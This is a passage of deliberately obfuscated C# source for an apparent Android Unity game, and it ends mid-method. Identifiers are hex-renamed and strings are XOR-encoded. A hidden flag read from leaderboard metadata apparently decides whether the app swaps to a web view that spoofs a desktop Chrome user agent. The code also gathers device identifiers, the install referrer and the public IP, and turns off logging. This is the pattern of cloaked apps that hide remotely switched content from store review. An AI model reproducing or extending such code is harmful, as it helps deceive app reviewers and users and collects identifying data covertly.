using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.Core;
using Unity.Services.Leaderboards;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

[Serializable]
public class _0x83b84ed4
{
    [JsonProperty(DefaultValueHandling = DefaultValueHandling.Ignore, NullValueHandling = NullValueHandling.Ignore)]
    [DefaultValue("")]
    public string meta = "";
    [JsonProperty(DefaultValueHandling = DefaultValueHandling.Ignore, NullValueHandling = NullValueHandling.Ignore)]
    [DefaultValue("")]
    public string payload = "";
    [JsonProperty(DefaultValueHandling = DefaultValueHandling.Ignore, NullValueHandling = NullValueHandling.Ignore)]
    [DefaultValue("")]
    public string isMeta = "";
}

public class _0xe91eb0ad : MonoBehaviour
{
    private bool _0x440f35f6 = false;
    private string _0x17443fd4;
    private ApplicationInstallMode _0x58d34cd0 = ApplicationInstallMode.Unknown;
    private static readonly string WindowsDesktopUserAgent = _0x530a90e8._0xfeee60cc(new byte[111] { 126, 92, 73, 90, 95, 95, 82, 28, 6, 29, 3, 19, 27, 100, 90, 93, 87, 92, 68, 64, 19, 125, 103, 19, 2, 3, 29, 3, 8, 19, 100, 90, 93, 5, 7, 8, 19, 75, 5, 7, 26, 19, 114, 67, 67, 95, 86, 100, 86, 81, 120, 90, 71, 28, 6, 0, 4, 29, 0, 5, 19, 27, 120, 123, 103, 126, 127, 31, 19, 95, 90, 88, 86, 19, 116, 86, 80, 88, 92, 26, 19, 112, 91, 65, 92, 94, 86, 28, 2, 1, 3, 29, 3, 29, 3, 29, 3, 19, 96, 82, 85, 82, 65, 90, 28, 6, 0, 4, 29, 0, 5 }, 51);
    private void OnApplicationFocus(bool _0x2de32982)
    {
        isApplicationFocus = _0x2de32982;
        if (_0x2de32982 && _0xb2d2a6ba)
        {
            _0xb6ecfb22();
        }
    }

    static readonly string TextAlphabet = _0x530a90e8._0xfeee60cc(new byte[93] { 224, 225, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190 }, 192);
    private string _0x2a9fdb2a = "";
    static System.IO.Compression.CompressionLevel SmallestCompression()
    {
        return Enum.IsDefined(typeof(System.IO.Compression.CompressionLevel), 3) ? (System.IO.Compression.CompressionLevel)3 : System.IO.Compression.CompressionLevel.Optimal;
    }

    static byte[] UnpackSmallest(byte[] _0x4853d7df, byte _0x9f82a84c)
    {
        if (_0x9f82a84c == 0)
            return _0x4853d7df;
        if (_0x9f82a84c == 1)
            return DecompressBrotli(_0x4853d7df);
        if (_0x9f82a84c == 2)
            return DecompressDeflate(_0x4853d7df);
        throw new FormatException();
    }

    private void Awake()
    {
        if (_0xcf88cf27 != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        _0xcf88cf27 = gameObject.GetComponent<_0xe91eb0ad>();
        DontDestroyOnLoad(gameObject);
        _0x1de60d77 = _0x7b8ae979 = _0x277f9db2 = "";
        _0x3ce72e0c = "";
        _0xb2d2a6ba = false;
    }

    internal bool IsHttpUrl(string _0xca42373d)
    {
        if (string.IsNullOrEmpty(_0xca42373d))
            return false;
        return _0xca42373d.StartsWith(_0x530a90e8._0xfeee60cc(new byte[7] { 95, 67, 67, 71, 13, 24, 24 }, 55), StringComparison.OrdinalIgnoreCase) || _0xca42373d.StartsWith(_0x530a90e8._0xfeee60cc(new byte[8] { 88, 68, 68, 64, 67, 10, 31, 31 }, 48), StringComparison.OrdinalIgnoreCase);
    }

    private bool _0x14f4a147 = false;
    private string _0x59d6cb5b = "";
    private JObject BuildRandomPayload(params string[] _0x62230342)
    {
        JObject _0xd52acf27 = new JObject();
        foreach (var _0x618ad6ab in _0x62230342)
        {
            string _0xf920e6ce;
            do
            {
                _0xf920e6ce = _0xb01285b4();
            }
            while (_0xd52acf27.ContainsKey(_0xf920e6ce));
            {
#if B_LOGS
                Debug.Log($"[Test] Crypto key={_0xf920e6ce} val={_0x618ad6ab}");
#endif
            }

            _0xd52acf27.Add(_0xf920e6ce, _0x618ad6ab == null ? "" : _0x618ad6ab);
        }

        return _0xd52acf27;
    }

    public void _0x078bfe0e()
    {
        if (_0xb2d2a6ba)
            return;
        {
#if B_LOGS
            {
                Debug.Log(_0x530a90e8._0xfeee60cc(new byte[33] { 250, 245, 196, 210, 213, 252, 129, 245, 200, 204, 196, 211, 129, 206, 212, 213, 129, 140, 159, 129, 204, 206, 215, 196, 129, 213, 206, 129, 210, 194, 196, 207, 196 }, 161));
            }
#endif
        }

        _0x1ef20944();
    }

    internal bool isDestroyedForce = false;
    private string _0xfd0ed577 = "";
    private async Task<bool> _0xf6686129(int _0x2c1245f4 = 5, int _0x7530ccf8 = 500)
    {
        CommState _0x4cf79cf8 = default;
        int _0x424e19a4 = 0;
        do
        {
            try
            {
                _0x4cf79cf8 = await _0x45007c03();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log(_0x530a90e8._0xfeee60cc(new byte[32] { 66, 77, 124, 106, 109, 68, 57, 104, 108, 124, 107, 96, 88, 106, 96, 119, 122, 75, 124, 106, 108, 117, 109, 106, 57, 124, 107, 107, 118, 107, 35, 57 }, 25) + e.Message);
                    }
#endif
                }
            }

            if (_0x4cf79cf8.Ready)
                break;
            await Task.Delay(_0x7530ccf8);
        }
        while (_0x424e19a4++ < _0x2c1245f4);
        bool _0x3351df7b = _0x4cf79cf8.Ready && _0x4cf79cf8.IsPrivacy;
        {
#if B_LOGS
            {
                Debug.Log(_0x530a90e8._0xfeee60cc(new byte[25] { 1, 14, 63, 41, 46, 7, 122, 19, 41, 10, 40, 51, 44, 59, 57, 35, 122, 40, 63, 41, 47, 54, 46, 96, 122 }, 90) + _0x3351df7b);
            }
#endif
        }

        return _0x3351df7b;
    }

    private string _0x6992494a = "";
    private string _0xdacf57d1 = "";
    internal bool IsGoogleAuthFlowUrl(string _0x784a375c)
    {
        if (string.IsNullOrEmpty(_0x784a375c))
            return false;
        return _0x784a375c.IndexOf(_0x530a90e8._0xfeee60cc(new byte[19] { 61, 63, 63, 51, 41, 50, 40, 47, 114, 59, 51, 51, 59, 48, 57, 114, 63, 51, 49 }, 92), StringComparison.OrdinalIgnoreCase) >= 0 || _0x784a375c.IndexOf(_0x530a90e8._0xfeee60cc(new byte[16] { 215, 213, 213, 217, 195, 216, 194, 197, 152, 209, 217, 217, 209, 218, 211, 152 }, 182), StringComparison.OrdinalIgnoreCase) >= 0 || _0x784a375c.IndexOf(_0x530a90e8._0xfeee60cc(new byte[21] { 161, 169, 169, 161, 170, 163, 179, 181, 163, 180, 165, 169, 168, 178, 163, 168, 178, 232, 165, 169, 171 }, 198), StringComparison.OrdinalIgnoreCase) >= 0 || _0x784a375c.IndexOf(_0x530a90e8._0xfeee60cc(new byte[11] { 210, 198, 193, 212, 193, 220, 214, 155, 214, 218, 216 }, 181), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private string _0xc392a561()
    {
        float _0x29b3ad49 = Time.realtimeSinceStartup;
        if (_0x29b3ad49 < 0f)
            _0x29b3ad49 = 0f;
        int _0x9dd193de = (int)(_0x29b3ad49 * 1000f);
        int _0x993085e3 = _0x9dd193de / 60000;
        int _0x5a98888d = (_0x9dd193de / 1000) % 60;
        int _0x8302b5c7 = _0x9dd193de % 1000;
        return string.Format(_0x530a90e8._0xfeee60cc(new byte[21] { 34, 105, 99, 105, 105, 36, 99, 34, 104, 99, 105, 105, 36, 99, 34, 107, 99, 105, 105, 105, 36 }, 89), _0x993085e3, _0x5a98888d, _0x8302b5c7);
    }

    internal Rect lastSafe = Rect.zero;
    internal Vector2 lastSize = Vector2.zero;
    private int _0x04258118 = -1;
    private async void Start()
    {
        await _0x4d3aaf9b();
    }

    private GameObject _0x6db16892;
    // MAIN FLOW
    private bool _0x0f8fe245 { get; set; }

    private IEnumerator _0xe6c1125a(IEnumerator _0x4188e912, TaskCompletionSource<bool> _0x64600049)
    {
        yield return _0x4188e912;
        _0x64600049.SetResult(true);
    }

    private string _0x2e40036f = "";
    private void _0x584fbae0(UniWebView _0xaf36bcbf)
    {
        _0xaf36bcbf.BackgroundColor = Color.clear;
        _0xaf36bcbf.SetSupportMultipleWindows(true, true);
        _0xaf36bcbf.SetBackButtonEnabled(false);
        _0x0d771b38.SetUserAgent(_0xb641090d());
    }

    private bool _0x9479662d = false;
    public void _0x1ef20944()
    {
        isDestroyedForce = true;
        StopAllCoroutines();
        {
#if B_LOGS
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[18] { 42, 37, 20, 2, 5, 44, 81, 61, 16, 4, 31, 18, 25, 81, 54, 16, 28, 20 }, 113));
#endif
        }

        _0x6c2d213c.Instance?._0x9f5eb49c();
        _0xb67d6cae.Instance._0xc4f3524a(_0xc29566dc._0x97b1c56c.DEFAULT);
    }

    private string _0x3ce72e0c = "";
    private bool _0x68058556()
    {
        var _0x20da5beb = Keyboard.current;
        return _0x20da5beb != null && _0x20da5beb.escapeKey.wasPressedThisFrame;
    }

    private void _0x8534911b()
    {
        {
#if B_LOGS
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[22] { 209, 222, 239, 249, 254, 215, 170, 217, 254, 229, 248, 239, 206, 239, 252, 227, 233, 239, 195, 228, 236, 229 }, 138));
#endif
        }

        _0xa452c823 = SystemInfo.deviceModel;
        _0x2e40036f = Application.version;
        _0x58d34cd0 = Application.installMode;
        _0x5d119317 = Application.installerName;
        _0xfd0ed577 = Application.identifier;
        _0x9bf29fde = _0x60be49de();
        _0x4e7d5ec0 = _0x6137b38a();
        _0x2a9fdb2a = SystemInfo.deviceUniqueIdentifier;
        _0x574823c1 = SystemInfo.graphicsDeviceName;
        _0xe4cc87f4 = SystemInfo.processorType;
        {
#if B_LOGS
            {
                _0x2e40036f = _0x530a90e8._0xfeee60cc(new byte[5] { 213, 204, 213, 204, 213 }, 226);
                _0x58d34cd0 = ApplicationInstallMode.Store;
                _0x5d119317 = _0x530a90e8._0xfeee60cc(new byte[19] { 132, 136, 138, 201, 134, 137, 131, 149, 136, 142, 131, 201, 145, 130, 137, 131, 142, 137, 128 }, 231);
                _0x4e7d5ec0 = _0x530a90e8._0xfeee60cc(new byte[8] { 6, 14, 19, 23, 26, 67, 22, 2 }, 99);
                _0x2a9fdb2a = Guid.NewGuid().ToString().Replace(_0x530a90e8._0xfeee60cc(new byte[1] { 163 }, 142), "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[17] { 71, 72, 121, 111, 104, 65, 60, 120, 121, 106, 81, 115, 120, 121, 112, 38, 60 }, 28) + _0xa452c823);
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[19] { 5, 10, 59, 45, 42, 3, 126, 63, 46, 46, 8, 59, 44, 45, 55, 49, 48, 100, 126 }, 94) + _0x2e40036f);
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[20] { 56, 55, 6, 16, 23, 62, 67, 10, 13, 16, 23, 2, 15, 15, 46, 12, 7, 6, 89, 67 }, 99) + _0x58d34cd0);
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[23] { 78, 65, 112, 102, 97, 72, 53, 124, 123, 102, 97, 116, 121, 121, 112, 103, 70, 97, 122, 103, 112, 47, 53 }, 21) + _0x5d119317);
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[14] { 82, 93, 108, 122, 125, 84, 41, 104, 121, 121, 64, 109, 51, 41 }, 9) + _0xfd0ed577);
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[14] { 145, 158, 175, 185, 190, 151, 234, 171, 174, 188, 131, 174, 240, 234 }, 202) + _0x9bf29fde);
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[18] { 185, 182, 135, 145, 150, 191, 194, 151, 145, 135, 144, 163, 133, 135, 140, 150, 216, 194 }, 226) + _0x4e7d5ec0);
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[17] { 200, 199, 246, 224, 231, 206, 179, 224, 234, 224, 215, 246, 229, 218, 247, 169, 179 }, 147) + _0x2a9fdb2a);
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[12] { 223, 208, 225, 247, 240, 217, 164, 227, 244, 241, 190, 164 }, 132) + _0x574823c1);
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[12] { 64, 79, 126, 104, 111, 70, 59, 120, 107, 110, 33, 59 }, 27) + _0xe4cc87f4);
#endif
        }
    }

    private bool _0x27211b0e = false;
    //    private async Task<string> GetMyip()
    //    {
    //        string result = "";
    //        var processorType = SystemInfo.processorType;
    //        //        {
    //        //#if NOT_B_STARTED
    //        //#endif
    //        if (!processorType.Contains("armv7", StringComparison.OrdinalIgnoreCase) && !processorType.Contains("x86-64", StringComparison.OrdinalIgnoreCase))
    //        {
    //            var tcs = new TaskCompletionSource<string>();
    //            // Primary and fallback STUN servers (Google STUN 1-6)
    //            var stunServers = new[]
    //            {
    //                new[] { "stun:stun.l.google.com:19302" },      // Primary
    //                //new[] { "stun:stun1.l.google.com:19302" },     // Fallback 1
    //                //new[] { "stun:stun2.l.google.com:19302" },     // Fallback 2
    //                //new[] { "stun:stun3.l.google.com:19302" },     // Fallback 3
    //                //new[] { "stun:stun4.l.google.com:19302" },     // Fallback 4
    //                //new[] { "stun:stun5.l.google.com:19302" },     // Fallback 5
    //                //new[] { "stun:stun6.l.google.com:19302" }      // Fallback 6
    //            };
    //            RTCPeerConnection pc = null;
    //            foreach (var serverUrls in stunServers)
    //            {
    //                if (tcs.Task.IsCompleted)
    //                    break;
    //                try
    //                {
    //                    var config = new RTCConfiguration
    //                    {
    //                        iceServers = new RTCIceServer[]
    //                        {
    //                    new RTCIceServer { urls = serverUrls }
    //                        },
    //                        iceTransportPolicy = RTCIceTransportPolicy.All
    //                    };
    //                    pc = new RTCPeerConnection(ref config);
    //                    pc.OnIceCandidate = candidate =>
    //                    {
    //                        if (candidate == null || tcs.Task.IsCompleted)
    //                            return;
    //                        if (candidate.Type == RTCIceCandidateType.Srflx || candidate.Type == RTCIceCandidateType.Prflx)
    //                        {
    //                            string address = candidate.Address;
    //                            string ip = "";
    //                            // Parse IP from address (which may be IPv4 "ip:port" or IPv6 "[ip]:port")
    //                            if (address.StartsWith("[") && address.Contains("]:"))
    //                            {
    //                                // IPv6 format: [2001:db8::1]:12345
    //                                int endBracket = address.IndexOf(']');
    //                                ip = address.Substring(1, endBracket - 1);
    //                            }
    //                            else if (address.Contains(':'))
    //                            {
    //                                // IPv4 format: 192.168.1.1:12345
    //                                int lastColon = address.LastIndexOf(':');
    //                                ip = address.Substring(0, lastColon);
    //                            }
    //                            else
    //                            {
    //                                // No port, just IP
    //                                ip = address;
    //                            }
    //                            {
    //#if B_LOGS
    //                                {
    //                                    Debug.Log($"[test STUN] Public IP: {ip} from {serverUrls[0]}");
    //                                }
    //#endif
    //                            }
    //                            tcs.TrySetResult(ip);
    //                        }
    //                    };
    //                    pc.CreateDataChannel("init");
    //                    var offerOp = pc.CreateOffer();
    //                    while (!offerOp.IsDone)
    //                        await Task.Yield();
    //                    var desc = offerOp.Desc;
    //                    pc.SetLocalDescription(ref desc);
    //                    float timeout = 10f;
    //                    float t = 0f;
    //                    while (!tcs.Task.IsCompleted && t < timeout)
    //                    {
    //                        await Task.Delay(100);
    //                        t += 0.1f;
    //                    }
    //                    if (tcs.Task.IsCompleted)
    //                    {
    //                        result = tcs.Task.Result;
    //                        break;
    //                    }
    //                    {
    //#if B_LOGS
    //                        {
    //                            Debug.Log($"[test STUN] Failed with {serverUrls[0]}, trying next...");
    //                        }
    //#endif
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //#if B_LOGS
    //                    {
    //                        Debug.Log($"[test STUN] Error with {serverUrls[0]}: {ex.Message}");
    //                    }
    //#endif
    //                    if (pc != null)
    //                    {
    //                        pc.Close();
    //                        pc.Dispose();
    //                    }
    //                }
    //            }
    //            if (!tcs.Task.IsCompleted)
    //                result = "";
    //        }
    //        //#if NOT_B_STARTED
    //        //            else
    //        //        if(result == "")
    //        //        {
    //        //            {
    //        //#if B_LOGS
    //        //                {
    //        //                    Debug.LogError($"[TEST] WebRTC DLL missing or ARMv7 architecture");
    //        //                }
    //        //#endif
    //        //            }
    //        //            result = await GetMyipFallback("0fce0027001c001700140011000b000a0008001f00180022001b00010024001e0025002300260002000400050006000300070000000c001d0015000d000f0021000900100019001a0013000e00120020001647175e80370ec5a1a5d9b1b039a49e64977f39d478adcf763f556d428a45d94f056b1d88f6b76874");
    //        //        }
    //        //#endif
    //        //        }
    //        {
    //#if B_LOGS
    //            {
    //                Debug.Log($"[Test] Get my ip: {result}");
    //            }
    //#endif
    //        }
    //        return result;
    //    }
    private async Task<string> _0x05b621d1()
    {
        var _0xe2affba1 = _0x530a90e8._0xfeee60cc(new byte[40] { 84, 72, 72, 76, 79, 6, 19, 19, 75, 75, 75, 18, 95, 80, 83, 73, 88, 90, 80, 93, 78, 89, 18, 95, 83, 81, 19, 95, 88, 82, 17, 95, 91, 85, 19, 72, 78, 93, 95, 89 }, 60);
        using (UnityWebRequest _0xd8c1d3c5 = UnityWebRequest.Get(_0xe2affba1))
        {
            await _0xd8c1d3c5.SendWebRequest();
            string[] _0xdd693d6a = _0xd8c1d3c5.downloadHandler.text.Split('\n');
            foreach (string _0xd91d694f in _0xdd693d6a)
            {
                if (_0xd91d694f.StartsWith(_0x530a90e8._0xfeee60cc(new byte[3] { 166, 191, 242 }, 207)))
                {
                    string _0xd6c4ae3d = _0xd91d694f.Substring(3);
                    {
#if B_LOGS
                        {
                            Debug.Log($"[Test] User ip (FALLBACK MODE): {_0xd6c4ae3d} from {_0xe2affba1}");
                        }
#endif
                    }

                    return _0xd6c4ae3d;
                }
            }
        }

        return "";
    }

    static byte[] ToBigEndian(System.Numerics.BigInteger _0x95474561)
    {
        var _0x7cad87bc = _0x95474561.ToByteArray();
        int _0x53949632 = _0x7cad87bc.Length;
        if (_0x53949632 > 1 && _0x7cad87bc[_0x53949632 - 1] == 0)
            _0x53949632--;
        var _0xcfaf237c = new byte[_0x53949632];
        for (int _0xe7541305 = 0; _0xe7541305 < _0x53949632; _0xe7541305++)
            _0xcfaf237c[_0xe7541305] = _0x7cad87bc[_0x53949632 - 1 - _0xe7541305];
        return _0xcfaf237c;
    }

    private IEnumerator RequestAndroidPermissionIfNeeded(string _0xd395d81a)
    {
        if (Permission.HasUserAuthorizedPermission(_0xd395d81a))
            yield break;
        bool _0x54601276 = false;
        var _0x8819cb72 = new PermissionCallbacks();
        _0x8819cb72.PermissionGranted += _0x0877421b => _0x54601276 = true;
        _0x8819cb72.PermissionDenied += _0x0877421b => _0x54601276 = true;
        Permission.RequestUserPermission(_0xd395d81a, _0x8819cb72);
        yield return new WaitUntil(() => _0x54601276);
    }

    private string _0x9bf29fde = "";
    private bool _0x0d39213f = false;
    private void WLog(string _0x8eea9009)
    {
#if B_LOGS
        {
            Debug.Log(_0x530a90e8._0xfeee60cc(new byte[7] { 22, 25, 40, 62, 57, 16, 109 }, 77) + _0x8eea9009);
        }
#endif
    }

    // WEB VIEW LOGIC
    public bool _0xb2d2a6ba { get; set; }

    private string _0xfea8f982 = "";
    private string _0x846ce3b4(string _0xf7b18f93, string _0x6f9d3f39)
    {
        if (string.IsNullOrEmpty(_0x6f9d3f39))
            return _0xf7b18f93;
        if (_0xf7b18f93.Contains(_0x530a90e8._0xfeee60cc(new byte[1] { 115 }, 76)))
            return _0xf7b18f93 + _0x530a90e8._0xfeee60cc(new byte[8] { 97, 52, 34, 41, 35, 46, 35, 122 }, 71) + UnityWebRequest.EscapeURL(_0x6f9d3f39);
        else
            return _0xf7b18f93 + _0x530a90e8._0xfeee60cc(new byte[8] { 97, 45, 59, 48, 58, 55, 58, 99 }, 94) + UnityWebRequest.EscapeURL(_0x6f9d3f39);
    }

    private string _0x4e7d5ec0 = "";
    private void _0xe65d780f(string _0xda064107)
    {
        _0xb6ecfb22();
        StartCoroutine(_0xa46aee83(_0xda064107));
    }

    internal bool ContainsIgnoreCase(string _0x9b1828bd, string _0x24e83af9)
    {
        if (string.IsNullOrEmpty(_0x9b1828bd) || string.IsNullOrEmpty(_0x24e83af9))
            return false;
        return _0x9b1828bd.IndexOf(_0x24e83af9, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private void OnDestroy()
    {
        StopAllCoroutines();
        _0x1ef20944();
    }

    private void _0x641403bd(string _0xf8abe973)
    {
        bool _0xe124443f = !string.IsNullOrEmpty(_0xf8abe973);
        if (_0xe124443f)
        {
            {
#if B_LOGS
                Debug.Log(_0x530a90e8._0xfeee60cc(new byte[13] { 107, 100, 85, 67, 68, 109, 16, 99, 88, 95, 71, 10, 16 }, 48) + _0xf8abe973);
#endif
            }

            _0xe65d780f(_0xf8abe973);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log(_0x530a90e8._0xfeee60cc(new byte[39] { 67, 76, 125, 107, 108, 69, 56, 94, 121, 116, 116, 122, 121, 123, 115, 56, 250, 158, 138, 56, 95, 121, 117, 125, 56, 48, 118, 119, 56, 126, 113, 118, 121, 116, 56, 77, 74, 84, 49 }, 24));
#endif
            }

            _0x1ef20944();
            return;
        }
    }

    private bool _0xa24d4f97 = false;
    static byte[] CompressDeflate(byte[] _0xaf6ec9fc)
    {
        using var _0xd008a3b5 = new MemoryStream();
        using (var _0x469bc3a8 = new DeflateStream(_0xd008a3b5, SmallestCompression()))
            _0x469bc3a8.Write(_0xaf6ec9fc, 0, _0xaf6ec9fc.Length);
        return _0xd008a3b5.ToArray();
    }

    internal bool firstLoadShown = false;
    private RectTransform _0xe999ef58;
    internal bool isApplicationPause = false;
    private string _0x6137b38a()
    {
        try
        {
            using (var _0x79e3ef88 = new AndroidJavaClass(_0x530a90e8._0xfeee60cc(new byte[30] { 39, 43, 41, 106, 49, 42, 45, 48, 61, 119, 32, 106, 52, 40, 37, 61, 33, 54, 106, 17, 42, 45, 48, 61, 20, 40, 37, 61, 33, 54 }, 68)))
            {
                var _0x1e19a668 = _0x79e3ef88.GetStatic<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[15] { 226, 244, 243, 243, 228, 239, 245, 192, 226, 245, 232, 247, 232, 245, 248 }, 129));
                var _0xb5bfebbd = _0x1e19a668.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[21] { 120, 122, 107, 94, 111, 111, 115, 118, 124, 126, 107, 118, 112, 113, 92, 112, 113, 107, 122, 103, 107 }, 31));
                using (var _0xcec7b873 = new AndroidJavaClass(_0x530a90e8._0xfeee60cc(new byte[26] { 249, 246, 252, 234, 247, 241, 252, 182, 239, 253, 250, 243, 241, 236, 182, 207, 253, 250, 203, 253, 236, 236, 241, 246, 255, 235 }, 152)))
                {
                    return _0xcec7b873.CallStatic<string>(_0x530a90e8._0xfeee60cc(new byte[19] { 37, 39, 54, 6, 39, 36, 35, 55, 46, 54, 23, 49, 39, 48, 3, 37, 39, 44, 54 }, 66), _0xb5bfebbd);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    async Task<CommState> _0x45007c03()
    {
        var _0x76bf040c = await LeaderboardsService.Instance.GetPlayerScoreAsync(LeaderboardId, new GetPlayerScoreOptions { IncludeMetadata = true });
        var _0x70edca26 = ReadScoreMetadata(_0x76bf040c != null ? _0x76bf040c.Metadata : null);
        if (string.IsNullOrEmpty(_0x70edca26.isMeta))
            return default;
        var _0x0fc470eb = _0xb19fff82(_0x70edca26.isMeta, _0xb3551ae3);
        if (_0x0fc470eb != _0x530a90e8._0xfeee60cc(new byte[4] { 126, 120, 127, 111 }, 10) && _0x0fc470eb != _0x530a90e8._0xfeee60cc(new byte[5] { 54, 49, 60, 35, 53 }, 80))
            return default;
        var _0xd64c2808 = _0xb19fff82(_0x70edca26.meta ?? "", _0xb3551ae3);
        return new CommState(true, _0x0fc470eb == _0x530a90e8._0xfeee60cc(new byte[4] { 93, 91, 92, 76 }, 41), _0xd64c2808);
    }

    private void _0x501a5d08()
    {
        WLog(_0x530a90e8._0xfeee60cc(new byte[21] { 229, 204, 223, 201, 218, 204, 223, 200, 141, 207, 204, 206, 198, 141, 221, 223, 200, 222, 222, 200, 201 }, 173));
        if (Time.frameCount == _0x04258118)
            return;
        _0x04258118 = Time.frameCount;
        if (_0xada8cf83())
            return;
        _0x5c547285();
    }

    private string _0xa452c823 = "";
    private Text _0x8aa35086;
    private bool _0xada8cf83()
    {
        if (_0x62aa9627())
            return true;
        if (_0x0d771b38 != null && _0x0d771b38.CanGoBack)
        {
            WLog(_0x530a90e8._0xfeee60cc(new byte[36] { 146, 187, 168, 190, 173, 187, 168, 191, 250, 184, 187, 185, 177, 250, 247, 228, 250, 183, 187, 179, 180, 250, 141, 191, 184, 140, 179, 191, 173, 250, 157, 181, 152, 187, 185, 177 }, 218));
            _0x0d771b38.GoBack();
            return true;
        }

        return false;
    }

    private bool TryOpenExternalLikeChrome(string _0x1f1c99ea)
    {
        if (string.IsNullOrEmpty(_0x1f1c99ea))
            return false;
        if (_0x1f1c99ea.StartsWith(_0x530a90e8._0xfeee60cc(new byte[9] { 31, 24, 2, 19, 24, 2, 76, 89, 89 }, 118), StringComparison.OrdinalIgnoreCase))
            return _0xa2958e67(_0x1f1c99ea);
        if (_0xf040da60(_0x1f1c99ea))
            return _0x77a8adb2(_0x1f1c99ea, null);
        if (!_0x1f1c99ea.StartsWith(_0x530a90e8._0xfeee60cc(new byte[7] { 160, 188, 188, 184, 242, 231, 231 }, 200), StringComparison.OrdinalIgnoreCase) && !_0x1f1c99ea.StartsWith(_0x530a90e8._0xfeee60cc(new byte[8] { 60, 32, 32, 36, 39, 110, 123, 123 }, 84), StringComparison.OrdinalIgnoreCase) && !_0x1f1c99ea.StartsWith(_0x530a90e8._0xfeee60cc(new byte[11] { 54, 53, 56, 34, 35, 109, 53, 59, 54, 57, 60 }, 87), StringComparison.OrdinalIgnoreCase))
        {
            return _0xfaedf53f(_0x1f1c99ea);
        }

        return false;
    }

    static int[] BuildTextAlphabetIndex()
    {
        var _0x5c06eb99 = new int[128];
        for (int _0xfbaa0761 = 0; _0xfbaa0761 < _0x5c06eb99.Length; _0xfbaa0761++)
            _0x5c06eb99[_0xfbaa0761] = -1;
        for (int _0x21a34ab0 = 0; _0x21a34ab0 < TextAlphabet.Length; _0x21a34ab0++)
            _0x5c06eb99[TextAlphabet[_0x21a34ab0]] = _0x21a34ab0;
        return _0x5c06eb99;
    }

    static byte[] PackSmallest(byte[] _0x80c3ac73, out byte _0xafa6aff1)
    {
        var _0x526cb501 = CompressBrotli(_0x80c3ac73);
        var _0x2be3b201 = CompressDeflate(_0x80c3ac73);
        if (_0x526cb501.Length < _0x80c3ac73.Length && _0x526cb501.Length <= _0x2be3b201.Length)
        {
            _0xafa6aff1 = 1;
            return _0x526cb501;
        }

        if (_0x2be3b201.Length < _0x80c3ac73.Length)
        {
            _0xafa6aff1 = 2;
            return _0x2be3b201;
        }

        _0xafa6aff1 = 0;
        return _0x80c3ac73;
    }

    // WEB VIEW LOGIC END
    internal void _0x5107976c()
    {
        // Ensure channel exists (safe to call multiple times)
        var _0x73d0cb38 = new AndroidNotificationChannel
        {
            Id = _0x530a90e8._0xfeee60cc(new byte[15] { 189, 188, 191, 184, 172, 181, 173, 134, 186, 177, 184, 183, 183, 188, 181 }, 217),
            Name = _0x530a90e8._0xfeee60cc(new byte[15] { 114, 83, 80, 87, 67, 90, 66, 22, 117, 94, 87, 88, 88, 83, 90 }, 54),
            Importance = Importance.High,
            Description = _0x530a90e8._0xfeee60cc(new byte[21] { 11, 41, 34, 41, 62, 45, 32, 108, 34, 35, 56, 37, 42, 37, 47, 45, 56, 37, 35, 34, 63 }, 76)
        };
        AndroidNotificationCenter.RegisterNotificationChannel(_0x73d0cb38);
        // Build notification
        var _0x0acf55e1 = new AndroidNotification
        {
            Title = _0x639fca71[UnityEngine.Random.Range(0, _0x639fca71.Length)],
            Text = _0x530a90e8._0xfeee60cc(new byte[21] { 128, 179, 164, 225, 184, 174, 180, 225, 178, 180, 179, 164, 225, 181, 174, 225, 164, 185, 168, 181, 254 }, 193),
            FireTime = System.DateTime.Now
        };
        // Send immediately
